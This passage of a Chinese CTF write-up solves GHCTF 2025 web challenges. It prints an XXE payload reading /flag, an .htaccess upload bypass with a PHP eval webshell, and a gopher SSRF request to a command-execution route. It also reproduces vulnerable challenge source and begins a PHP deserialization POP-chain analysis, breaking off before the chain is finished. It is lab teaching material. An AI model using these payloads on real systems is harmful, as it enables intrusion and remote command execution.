<pre><code class="language-python">parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    root = etree.fromstring(xml, parser)
    name = root.find(&#39;name&#39;).text
    return name or None
</code></pre>
<p>因为解析器启用了resolve_entities&#x3D;True，所以这里我推断存在xxe（<font style="color:rgb(139, 139, 139);">XML外部实体注入（XXE）漏洞</font>）</p>
<p>构建xml引用file:&#x2F;&#x2F;&#x2F;flag</p>
<pre><code class="language-xml">&lt;!DOCTYPE foo [
&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;
]&gt;
&lt;root&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;
</code></pre>
<p>将xml进行url编码</p>
<p>并使用POST发包</p>
<pre><code class="language-python">xml=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///flag%22%3E]%3E%3Croot%3E%3Cname%3E%26xxe;%3C/name%3E%3C/root%3E
</code></pre>
<p><img src="1741593612324-6d211200-2105-4c0a-a452-0b5d78c34e7e.png" loading="lazy"></p>
<p>flag</p>
<p><font style="color:rgb(0, 0, 0);">NSSCTF{e6a0765a-7b69-4b91-b17b-103f97cf97f8}</font></p>
<h1 id="GHCTF-2025-UPUPUP"><a href="#GHCTF-2025-UPUPUP" class="headerlink" title="[GHCTF 2025]UPUPUP"></a>[GHCTF 2025]UPUPUP</h1><h2 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6590">https://www.nssctf.cn/problem/6590</a></p>
<h2 id="题解-wp-2"><a href="#题解-wp-2" class="headerlink" title="题解(wp)"></a>题解(wp)</h2><p>打开题目</p>
<p><img src="1741594739679-a184e752-6193-4937-8d0f-b06d0bb3ee6c.png" loading="lazy"></p>
<p>文件上传题目</p>
<p>尝试上传phpinfo()</p>
<p><img src="1741594938128-f1d8005c-aa70-4e20-a0ad-4e9b7d1491d1.png" loading="lazy"></p>
<p><img src="1741594986679-5a81e84d-4c14-480b-a567-240b7e44a1cb.png" loading="lazy"></p>
<p>看来是对文件内容有过滤</p>
<p>换一种</p>
<p>直接在图片末尾加上<?php phpinfo(); ?></p>
<p><img src="1741595246431-d21b9db9-b0cc-428e-b902-59ea588ae127.png" loading="lazy"></p>
<p>上传</p>
<p><img src="1741595269700-75fd21a0-1f53-40fb-94fa-e8ba8632ec99.png" loading="lazy"></p>
<p>上传成功，但是却是以jpg结尾的（php结尾的会被过滤），无法解析</p>
<p>想到apache服务器的上传<font style="color:rgb(38,38,38);">.htaccess文件进行解析绕过</font></p>
<p><img src="1741595417742-6d21483b-044d-437a-bbf0-6c6d8ca641a7.png" loading="lazy"></p>
<p><img src="1741595430137-b14a9e42-394d-4131-ab78-32de2023d71b.png" loading="lazy"></p>
<p>😕</p>
<p>想到了文件头绕过</p>
<p><font style="color:rgb(38,38,38);">但如果直接在 .htaccess 开头加⼊ GIF89A 的话访问整个 images ⽬录下的⽂件都会爆 </font></p>
<p><font style="color:rgb(38,38,38);">500, 会出现语法错误</font></p>
<p><font style="color:rgb(38,38,38);">.htaccess 通过 # 来注释, 后来了解到还有 \x00</font></p>
<pre><code class="language-python">#define width 1
#define height 1
&lt;FilesMatch &quot;jpg&quot;&gt;
  SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p><img src="1741596107226-488edb76-afd1-46d8-8366-43bf5ae412a2.png" loading="lazy"></p>
<p>上传成功</p>
<p><img src="1741596131525-61d9314a-cb11-41d1-95dd-fa2a74701273.png" loading="lazy"></p>
<p>上传一句话木马</p>
<p>hey.hey</p>
<pre><code class="language-php">#define width 1
#define height 1
&lt;?php
  eval($_POST[&quot;anro&quot;]);
?&gt;
</code></pre>
<p><img src="1741596603705-69f2f4b9-cf95-4184-8f5f-b5dd2d351fb6.png" loading="lazy"></p>
<p><img src="1741596646329-3e9e4b9f-f486-4ef3-a975-c0e9b903b696.png" loading="lazy"></p>
<h1 id="GHCTF-2025-Goph3rrr"><a href="#GHCTF-2025-Goph3rrr" class="headerlink" title="[GHCTF 2025]Goph3rrr"></a>[GHCTF 2025]Goph3rrr</h1><h2 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6582">https://www.nssctf.cn/problem/6582</a></p>
<h2 id="题解（wp）"><a href="#题解（wp）" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p><img src="1741603959131-15504d0f-710d-4cdb-9a4a-f7456950bda4.png" loading="lazy"></p>
<p>打开题目</p>
<p>看看前端有没有什么东西</p>
<p><img src="1741604022435-480e1814-42c5-4f78-b33a-653ef74fc1b3.png" loading="lazy"></p>
<p>什么都没找到</p>
<p>使用dirsearch 进行目录扫描</p>
<p><img src="1741605001752-56e85db7-14ec-4630-898d-58684a110edd.png" loading="lazy"></p>
<p><img src="1741605028946-a85e4977-3b8c-4ba8-9643-326538f0206f.png" loading="lazy"></p>
<p>打开源码</p>
<pre><code class="language-python">from flask import Flask, request, send_file, render_template_string
import os
from urllib.parse import urlparse, urlunparse
import subprocess
import socket
import hashlib
import base64
import random

app = Flask(__name__)
BlackList = [
    &quot;127.0.0.1&quot;
]

@app.route(&#39;/&#39;)
def index():
    return &#39;&#39;&#39;
    &lt;html&gt;
        &lt;head&gt;
            &lt;style&gt;
                body &#123;
                    background-size: cover; /* 背景图片覆盖整个页面 */
                    height: 100vh; /* 页面高度填满浏览器窗口 */
                    display: flex;
                    justify-content: center; /* 水平居中 */
                    align-items: center; /* 垂直居中 */
                    color: white; /* 字体颜色 */
                    font-family: Arial, sans-serif; /* 字体 */
                    text-align: center; /* 文字居中 */
                &#125;
                h1 &#123;
                    font-size: 50px;
                    transition: transform 0.2s ease-in-out; /* 设置浮动效果过渡时间 */
                &#125;
                h1:hover &#123;
                    transform: translateY(-10px); /* 向上浮动 */
                &#125;
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;h1&gt;Hello Ctfer!!! Welcome to the GHCTF challenge! (≧∇≦)&lt;/h1&gt;
        &lt;/body&gt;
    &lt;/html&gt;
    &#39;&#39;&#39;

@app.route(&#39;/Login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def login():
    junk_code()
    if request.method == &#39;POST&#39;:
        username = request.form.get(&#39;username&#39;)
        password = request.form.get(&#39;password&#39;)
        if username in users and users[username][&#39;password&#39;] == hashlib.md5(password.encode()).hexdigest():
            return b64e(f&quot;Welcome back, &#123;username&#125;!&quot;)
        return b64e(&quot;Invalid credentials!&quot;)
    return render_template_string(&quot;&quot;&quot;
        &lt;!DOCTYPE html&gt;
        &lt;html lang=&quot;en&quot;&gt;
        &lt;head&gt;
            &lt;meta charset=&quot;UTF-8&quot;&gt;
            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
            &lt;title&gt;Login&lt;/title&gt;
            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
            &lt;style&gt;
                body &#123;
                    background-color: #f8f9fa;
                &#125;
                .container &#123;
                    max-width: 400px;
                    margin-top: 100px;
                &#125;
                .card &#123;
                    border: none;
                    border-radius: 10px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                &#125;
                .card-header &#123;
                    background-color: #007bff;
                    color: white;
                    text-align: center;
                    border-radius: 10px 10px 0 0;
                &#125;
                .btn-primary &#123;
                    background-color: #007bff;
                    border: none;
                &#125;
                .btn-primary:hover &#123;
                    background-color: #0056b3;
                &#125;
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;div class=&quot;container&quot;&gt;
                &lt;div class=&quot;card&quot;&gt;
                    &lt;div class=&quot;card-header&quot;&gt;
                        &lt;h3&gt;Login&lt;/h3&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;card-body&quot;&gt;
                        &lt;form method=&quot;POST&quot;&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;
                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;
                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
                            &lt;/div&gt;
                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;Login&lt;/button&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    &quot;&quot;&quot;)

@app.route(&#39;/Gopher&#39;)
def visit():
    url = request.args.get(&#39;url&#39;)
    if url is None:
        return &quot;No url provided :)&quot;
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == &quot;file&quot; or realIpAddress in BlackList:
        return &quot;No (≧∇≦)&quot;
    result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)
    return result.stdout

@app.route(&#39;/RRegister&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def register():
    junk_code()
    if request.method == &#39;POST&#39;:
        username = request.form.get(&#39;username&#39;)
        password = request.form.get(&#39;password&#39;)
        if username in users:
            return b64e(&quot;Username already exists!&quot;)
        users[username] = &#123;&#39;password&#39;: hashlib.md5(password.encode()).hexdigest()&#125;
        return b64e(&quot;Registration successful!&quot;)
    return render_template_string(&quot;&quot;&quot;
        &lt;!DOCTYPE html&gt;
        &lt;html lang=&quot;en&quot;&gt;
        &lt;head&gt;
            &lt;meta charset=&quot;UTF-8&quot;&gt;
            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
            &lt;title&gt;Register&lt;/title&gt;
            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
            &lt;style&gt;
                body &#123;
                    background-color: #f8f9fa;
                &#125;
                .container &#123;
                    max-width: 400px;
                    margin-top: 100px;
                &#125;
                .card &#123;
                    border: none;
                    border-radius: 10px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                &#125;
                .card-header &#123;
                    background-color: #28a745;
                    color: white;
                    text-align: center;
                    border-radius: 10px 10px 0 0;
                &#125;
                .btn-success &#123;
                    background-color: #28a745;
                    border: none;
                &#125;
                .btn-success:hover &#123;
                    background-color: #218838;
                &#125;
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;div class=&quot;container&quot;&gt;
                &lt;div class=&quot;card&quot;&gt;
                    &lt;div class=&quot;card-header&quot;&gt;
                        &lt;h3&gt;Register&lt;/h3&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;card-body&quot;&gt;
                        &lt;form method=&quot;POST&quot;&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;
                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;
                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
                            &lt;/div&gt;
                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-success w-100&quot;&gt;Register&lt;/button&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    &quot;&quot;&quot;)

@app.route(&#39;/Manage&#39;, methods=[&#39;POST&#39;])
def cmd():
    if request.remote_addr != &quot;127.0.0.1&quot;:
        return &quot;Forbidden!!!&quot;
    if request.method == &quot;GET&quot;:
        return &quot;Allowed!!!&quot;
    if request.method == &quot;POST&quot;:
        return os.popen(request.form.get(&quot;cmd&quot;)).read()

@app.route(&#39;/Upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def upload_avatar():
    junk_code()
    if request.method == &#39;POST&#39;:
        username = request.form.get(&#39;username&#39;)
        if username not in users:
            return b64e(&quot;User not found!&quot;)
        file = request.files.get(&#39;avatar&#39;)
        if file:
            file.save(os.path.join(avatar_dir, f&quot;&#123;username&#125;.png&quot;))
            return b64e(&quot;Avatar uploaded successfully!&quot;)
        return b64e(&quot;No file uploaded!&quot;)
    return render_template_string(&quot;&quot;&quot;
        &lt;!DOCTYPE html&gt;
        &lt;html lang=&quot;en&quot;&gt;
        &lt;head&gt;
            &lt;meta charset=&quot;UTF-8&quot;&gt;
            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
            &lt;title&gt;Upload Avatar&lt;/title&gt;
            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
            &lt;style&gt;
                body &#123;
                    background-color: #f8f9fa;
                &#125;
                .container &#123;
                    max-width: 400px;
                    margin-top: 100px;
                &#125;
                .card &#123;
                    border: none;
                    border-radius: 10px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                &#125;
                .card-header &#123;
                    background-color: #dc3545;
                    color: white;
                    text-align: center;
                    border-radius: 10px 10px 0 0;
                &#125;
                .btn-danger &#123;
                    background-color: #dc3545;
                    border: none;
                &#125;
                .btn-danger:hover &#123;
                    background-color: #c82333;
                &#125;
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;div class=&quot;container&quot;&gt;
                &lt;div class=&quot;card&quot;&gt;
                    &lt;div class=&quot;card-header&quot;&gt;
                        &lt;h3&gt;Upload Avatar&lt;/h3&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;card-body&quot;&gt;
                        &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;
                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;avatar&quot; class=&quot;form-label&quot;&gt;Avatar&lt;/label&gt;
                                &lt;input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatar&quot; name=&quot;avatar&quot; required&gt;
                            &lt;/div&gt;
                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger w-100&quot;&gt;Upload&lt;/button&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    &quot;&quot;&quot;)


@app.route(&#39;/app.py&#39;)
def download_source():
    return send_file(__file__, as_attachment=True)

if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=8000)
</code></pre>
<p>讲真的拿到源码的时候，我看到了一长串的密文被吓到了，然后往前翻的时候才看到这是背景图片的base64……..</p>
<p> <strong>分析源码</strong></p>
<p>首先分析各个路由都是干嘛的</p>
<p><strong>&#x2F;Login和&#x2F;RRegister路由</strong></p>
<p>登录和注册</p>
<p>处理用户登录和注册。用户密码使用MD5哈希存储</p>
<p><strong>&#x2F;Gopher 路由和&#x2F;Manage路由</strong></p>
<p>接收一个url参数，然后使用curl访问该URL</p>
<p>很容易就想到了SSRF，需要绕过过滤</p>
<p><font style="color:rgb(139, 139, 139);">- 检查URL的scheme是否是file，如果是则拒绝。</font></p>
<p><font style="color:rgb(139, 139, 139);">- 解析URL的主机名，获取其真实IP（realIpAddress），并检查是否在黑名单BlackList中（当前只有127.0.0.1）。</font></p>
<p><font style="color:rgb(139, 139, 139);">- 如果通过检查，则用curl访问该URL，并返回结果。</font></p>
<pre><code class="language-python">@app.route(&#39;/Gopher&#39;)
def visit():
    url = request.args.get(&#39;url&#39;)
    if url is None:
        return &quot;No url provided :)&quot;
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == &quot;file&quot; or realIpAddress in BlackList:
        return &quot;No (≧∇≦)&quot;
    result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)
    return result.stdout
</code></pre>
<p><strong>&#x2F;Upload路由</strong></p>
<p>允许上传头像，保存为PNG文件，由于源码采用的是Flask，可能不会执行</p>
<p>在处理上传文件时,如果用户名包含模板注入的payload，并且文件名被渲染到模板中，可能导致SSTI。但当前代码中，上传成功后的返回信息是经过base64编码的，没有使用模板渲染,所以不大可能存在ssti</p>
<h3 id="分析漏洞点"><a href="#分析漏洞点" class="headerlink" title="分析漏洞点"></a>分析漏洞点</h3><p>从每个路由的作用和功能来看，目前就只有ssrf这一个突破点😤</p>
<p>现在唯一可能的方法是使用Gopher协议发送POST请求，并且绕过hostname的检查。</p>
<p>也就是构造一个Gopher URL，并且不能存在于黑名单</p>
<p>也就是不能等于127.0.0.1</p>
<pre><code class="language-python">app = Flask(__name__)
BlackList = [
    &quot;127.0.0.1&quot;
]
</code></pre>
<p>这里我提供两种解决方法</p>
<h4 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h4><p>利用DNS重绑定攻击，让请求的URL不包含127.0.0.1</p>
<p>这里推荐一篇关于DNS重绑定攻击的文章</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36348899/article/details/119297854">https://blog.csdn.net/qq_36348899&#x2F;article&#x2F;details&#x2F;119297854</a></p>
<p>重绑定的网址</p>
<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<h4 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h4><p>我们的URL地址不能包含127.0.0.1，但是并没有说地址不能包含其它的127的地址呀</p>
<p>也就是所有以127开头的本地回环地址都可以作为发送的URL地址</p>
<p>这里我就采用第二种方法</p>
<p>构造一个Gopher URL，发送的数据以POST请求到127.0.0.1:8000&#x2F;Manage，并携带cmd参数</p>
<p>有点绕，重新梳理一下</p>
<ul>
<li>&#x2F;Manage路由的POST请求可以执行命令，但必须remote_addr是127.0.0.1。</li>
<li>&#x2F;Gopher路由存在SSRF，但无法发送POST请求，并且当连接到127.0.0.1时会被过滤。</li>
</ul>
<p>那么第一步，首先构造Gopher URL</p>
<pre><code class="language-python">http://node6.anna.nssctf.cn:24175/Manage
</code></pre>
<p>并且POST发包，发送cmd参数</p>
<pre><code class="language-python">cmd=env
</code></pre>
<p>完整的请求为</p>
<pre><code class="language-python">POST /Manage HTTP/1.1
host:127.0.0.1
Content-Type:application/x-www-form-urlencoded
Content-Length:7

cmd=env
</code></pre>
<p>第二步，<font style="color:rgb(64, 64, 64);">将构造的Gopher URL作为参数发送到</font><code>&lt;font style=&quot;color:rgb(64, 64, 64);&quot;&gt;/Gopher&lt;/font&gt;</code><font style="color:rgb(64, 64, 64);">路由</font></p>
<p><font style="color:rgb(64, 64, 64);">将上面的完整请求转化为参数，经过两次url转码</font></p>
<p><font style="color:rgb(64, 64, 64);">变为</font></p>
<pre><code class="language-python">POST%2520%252FManage%2520HTTP%252
F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-for
m-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv
</code></pre>
<p>把参数和127.0.0.2:8000进行拼接（黑名单过滤了127.0.0.1所以用127.0.0.2）</p>
<pre><code class="language-python">/Gopher?url=gopher://127.0.0.2:8000/_POST%2520%252FManage%2520HTTP%252
F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-for
m-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv
</code></pre>
<p>发包<br><img src="1741610144938-0392732d-640c-46c4-82ae-faa92ef1606e.png" loading="lazy"></p>
<p>成功获取flag</p>
<p><font style="color:rgb(0, 0, 0);">NSSCTF{5631b4f8-a764-40a0-acf7-cb05bcd40a00}</font></p>
<p>为什么用env命令</p>
<p>其它参数也试过但没有找到flag,谁会想到它藏在了环境当中啊💔</p>
<h1 id="GHCTF-2025-Popppppp"><a href="#GHCTF-2025-Popppppp" class="headerlink" title="[GHCTF 2025]Popppppp"></a>[GHCTF 2025]Popppppp</h1><h2 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6591">https://www.nssctf.cn/problem/6591</a></p>
<h2 id="题解（wp）-1"><a href="#题解（wp）-1" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p>打开题目</p>
<p><img src="1741761056352-81310bcb-a890-4f4a-940c-a141425541a6.png" loading="lazy"></p>
<pre><code class="language-php">&lt;?php
error_reporting(0);

class CherryBlossom &#123;
    public $fruit1;
    public $fruit2;

    public function __construct($a) &#123;
        $this-&gt;fruit1 = $a;
    &#125;

    function __destruct() &#123;
        echo $this-&gt;fruit1;
    &#125;

    public function __toString() &#123;
        $newFunc = $this-&gt;fruit2;
        return $newFunc();
    &#125;
&#125;

class Forbidden &#123;
    private $fruit3;

    public function __construct($string) &#123;
        $this-&gt;fruit3 = $string;
    &#125;

    public function __get($name) &#123;
        $var = $this-&gt;$name;
        $var[$name]();
    &#125;
&#125;

class Warlord &#123;
    public $fruit4;
    public $fruit5;
    public $arg1;

    public function __call($arg1, $arg2) &#123;
        $function = $this-&gt;fruit4;
        return $function();
    &#125;

    public function __get($arg1) &#123;
        $this-&gt;fruit5-&gt;ll2(&#39;b2&#39;);
    &#125;
&#125;

class Samurai &#123;
    public $fruit6;
    public $fruit7;

    public function __toString() &#123;
        $long = @$this-&gt;fruit6-&gt;add();
        return $long;
    &#125;

    public function __set($arg1, $arg2) &#123;
        if ($this-&gt;fruit7-&gt;tt2) &#123;
            echo &quot;xxx are the best!!!&quot;;
        &#125;
    &#125;
&#125;

class Mystery &#123;

    public function __get($arg1) &#123;
        array_walk($this, function ($day1, $day2) &#123;
            $day3 = new $day2($day1);
            foreach ($day3 as $day4) &#123;
                echo ($day4 . &#39;&lt;br&gt;&#39;);
            &#125;
        &#125;);
    &#125;
&#125;

class Princess &#123;
    protected $fruit9;

    protected function addMe() &#123;
        return &quot;The time spent with xxx is my happiest time&quot; . $this-&gt;fruit9;
    &#125;

    public function __call($func, $args) &#123;
        call_user_func([$this, $func . &quot;Me&quot;], $args);
    &#125;
&#125;

class Philosopher &#123;
    public $fruit10;
    public $fruit11=&quot;sr22kaDugamdwTPhG5zU&quot;;

    public function __invoke() &#123;
        if (md5(md5($this-&gt;fruit11)) == 666) &#123;
            return $this-&gt;fruit10-&gt;hey;
        &#125;
    &#125;
&#125;

class UselessTwo &#123;
    public $hiddenVar = &quot;123123&quot;;

    public function __construct($value) &#123;
        $this-&gt;hiddenVar = $value;
    &#125;

    public function __toString() &#123;
        return $this-&gt;hiddenVar;
    &#125;
&#125;

class Warrior &#123;
    public $fruit12;
    private $fruit13;

    public function __set($name, $value) &#123;
        $this-&gt;$name = $value;
        if ($this-&gt;fruit13 == &quot;xxx&quot;) &#123;
            strtolower($this-&gt;fruit12);
        &#125;
    &#125;
&#125;

class UselessThree &#123;
    public $dummyVar;

    public function __call($name, $args) &#123;
        return $name;
    &#125;
&#125;

class UselessFour &#123;
    public $lalala;

    public function __destruct() &#123;
        echo &quot;Hehe&quot;;
    &#125;
&#125;

if (isset($_GET[&#39;GHCTF&#39;])) &#123;
    unserialize($_GET[&#39;GHCTF&#39;]);
&#125; else &#123;
    highlight_file(__FILE__);
&#125;
</code></pre>
<p>直接看最后有接收参数，并且进行反序列化</p>
<p>ok，太长😱，不做了</p>
<p><img src="1741769819330-d1c32618-88ed-4166-8867-5241558bb9d7.jpeg" loading="lazy"></p>
<p>该来的还是会来的</p>
<p>首先可以确认的是<font style="color:rgb(38,38,38);">一道pop链构造，并且要找到⼀整条链⼦的构造</font>，</p>
<p>那么就要找到链尾（就是执行恶意代码的地方）</p>
<p>分析这些类都是干啥的</p>
<ol>
<li><strong>CherryBlossom</strong>类：</li>
</ol>
<ul>
<li><code>__destruct()</code>方法会输出<code>fruit1</code>，如果<code>fruit1</code>是一个对象，可能会触发其<code>__toString()</code>方法。</li>
<li><code>__toString()</code>方法会调用<code>fruit2</code>作为函数，所以如果<code>fruit2</code>是一个可调用的对象（比如有<code>__invoke()</code>方法），就会触发。</li>
</ul>
<pre><code class="language-php">class CherryBlossom &#123;
    public $fruit1;
    public $fruit2;

    public function __construct($a) &#123;
        $this-&gt;fruit1 = $a;
    &#125;

    function __destruct() &#123;
        echo $this-&gt;fruit1;
    &#125;

    public function __toString() &#123;
        $newFunc = $this-&gt;fruit2;
        return $newFunc();
    &#125;
&#125;
</code></pre>
<ol start="2">
<li><strong>Forbidden</strong>类：</li>
</ol>
<ul>
<li><code>__get()</code>方法会尝试调用<code>$var[$name]()</code>。这里如果<code>$var</code>是一个数组，并且某个键对应的方法存在，可能会被调用。</li>
</ul>
<ol start="3">
<li><strong>Warlord</strong>类：</li>
</ol>
<ul>
<li><code>__call()</code>方法会调用<code>fruit4</code>作为函数。</li>
<li><code>__get()</code>方法会调用<code>fruit5-&gt;ll2(&#39;b2&#39;)</code>，如果<code>fruit5</code>有<code>ll2</code>方法的话。</li>
</ul>
<ol start="4">
<li><strong>Samurai</strong>类：</li>
</ol>
<ul>
<li><code>__toString()</code>方法调用<code>fruit6-&gt;add()</code>，如果<code>fruit6</code>有<code>add()</code>方法的话。</li>
<li><code>__set()</code>方法检查<code>fruit7-&gt;tt2</code>是否为真，可能触发<code>__get()</code>。</li>
</ul>
<ol start="5">
<li><strong>Mystery</strong>类：</li>
</ol>
<ul>
<li><code>__get()</code>方法使用<code>array_walk</code>遍历自身属性，可能会实例化某些类并输出内容。</li>
</ul>
<ol start="6">
<li><strong>Princess</strong>类：</li>
</ol>
<ul>
<li><code>__call()</code>方法会尝试调用<code>addMe()</code>，但似乎没有明显的危险操作。</li>
</ul>
<ol start="7">
<li><strong>Philosopher</strong>类：</li>
</ol>
<ul>
<li><code>__invoke()</code>方法在对象被当作函数调用时触发。这里检查<code>md5(md5($this-&gt;fruit11)) == 666</code>，如果满足，返回<code>fruit10-&gt;hey</code>。需要找到<code>fruit11</code>的值使得双重MD5等于666，但看起来<code>fruit11</code>默认是”sr22kaDugamdwTPhG5zU”，可能需要覆盖它。</li>
</ul>
<ol start="8">
<li><strong>UselessTwo</strong>类：</li>
</ol>
<ul>
<li>简单的<code>__toString()</code>，返回隐藏变量。</li>
</ul>
<ol start="9">
<li><strong>Warrior</strong>类：</li>
</ol>
<ul>
<li><code>__set()</code>方法在设置属性时触发，可能通过<code>strtolower</code>触发其他操作。</li>
</ul>
<p>那么链尾就明了了，就是Samurai类的_get()方法</p>
<p>但是该如何触发这_get方法呢？</p>
<p><font style="color:rgb(38,38,38);">在从不可访问的属性读取数据或者不存在这个键都会调⽤ __get() ⽅法。 </font></p>
<p><font style="color:rgb(38,38,38);">此时我们发现在 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">Philosopher</font><font style="color:rgb(38,38,38);"> 这个类中存在访问不存在的键值 key 这个操作，⾃然就会触发 _ </font></p>
<p><font style="color:rgb(38,38,38);">_</font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">get(</font><font style="color:rgb(38,38,38);">) 函数</font></p>
<p><img src="1742031281304-2487266d-0f2b-4338-ae73-f4e4a808f0fa.png" loading="lazy"></p>
<p><font style="color:rgb(38,38,38);">我们发现该函数是魔术魔⽅ </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__invoke()</font><font style="color:rgb(38,38,38);"> ；那么我们就继续想如何才能触发这个</font><font style="color:rgb(38,38,38);background-color:#D8DAD9;"> __invoke()</font><font style="color:rgb(38,38,38);"> 函数 </font></p>
<p><font style="color:rgb(38,38,38);">呢？当尝试将对象调⽤为函数时触发 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__invoke()</font><font style="color:rgb(38,38,38);"> 。所以此时我们就需要寻找有哪个对象被当作函数 </font></p>
<p><font style="color:rgb(38,38,38);">进⾏调⽤了。 </font></p>
<p><font style="color:rgb(38,38,38);">我们继续进⾏源码审计发现在 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">Warlord</font><font style="color:rgb(38,38,38);"> 这个类中出现了将对象调⽤为函数的操作：</font></p>
<p><img src="1742031305284-a6979849-3d9e-4527-9819-96775689e1f3.png" loading="lazy"></p>
<p><font style="color:rgb(38,38,38);">我们观察到该函数为魔术魔⽅</font><font style="color:rgb(38,38,38);background-color:#D8DAD9;"> _call() </font><font style="color:rgb(38,38,38);">；那么我们就继续想如何才能触发这个 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__call()</font><font style="color:rgb(38,38,38);"> ；在对象 </font></p>
<p><font style="color:rgb(38,38,38);">上下⽂中调⽤不可访问的⽅法或不存在的⽅法时触发 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__call()</font><font style="color:rgb(38,38,38);"> 。 </font></p>
